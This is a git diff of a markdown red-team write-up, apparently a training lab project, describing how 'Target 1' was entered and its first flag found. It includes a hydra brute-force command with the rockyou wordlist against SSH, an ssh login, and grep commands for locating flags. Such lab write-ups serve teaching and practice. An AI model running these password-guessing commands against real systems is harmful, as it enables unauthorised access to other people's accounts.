@@ -54,8 +54,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
     - **_CVE-2021-28041_ Open SSH AND _Weak Password_**
       - Ran a Brute Force Attack to obtain michael's password and then ssh into the server
-      - Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
-      - Command: ssh michael@192.168.1.110
+        - Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
 
 - Brute Force
 
@@ -63,9 +62,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 ![brute force2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/hydra_2.png)
 
-- SSH Michael
+- Command: ssh michael@192.168.1.110
 
 ![ssh michael](https://github.com/crashandmayhem/Final-Project/blob/main/Images/ssh%20michael.png)
+
+-Found Flag 1 through scanning through the files and directories and also ran a GREP command
+ - Commands:
+ - cd /
+ - cd /var/www
+ - grep -R flag
+
+![flag1_1](https://github.com/crashandmayhem/Final-Project/blob/main/Images/flag%201.png)
+
+![flag1_2](https://github.com/crashandmayhem/Final-Project/blob/main/Images/grep%20for%20flags.png)
 
   - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
     - **Exploit Used**
